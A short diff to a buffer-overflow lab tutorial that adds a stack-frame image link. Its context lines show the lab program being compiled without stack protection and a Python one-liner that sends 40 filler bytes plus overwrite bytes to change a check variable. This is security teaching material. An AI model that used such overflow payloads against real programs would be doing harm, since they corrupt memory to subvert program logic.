@@ -87,7 +87,8 @@ Firstly, we need to compile the code.
 $ gcc -g bof2.c -o bof2.out -fno-stack-protector -mpreferred-stack-boundary=2
 ```
 We know the stack frame of the main function
-![stack-frame]()
+![stack-frame](https://github.com/user-attachments/assets/43658cfe-612d-4506-9403-d99d41aa7a76)
+
 We know the array is 40 bytes long, so we need to overwrite 40 bytes to reach the check variable.
 ```shell script
 $ echo $(python -c 'print "A"*40 + "\x01\x02\x03\x04"') | ./bof2.out
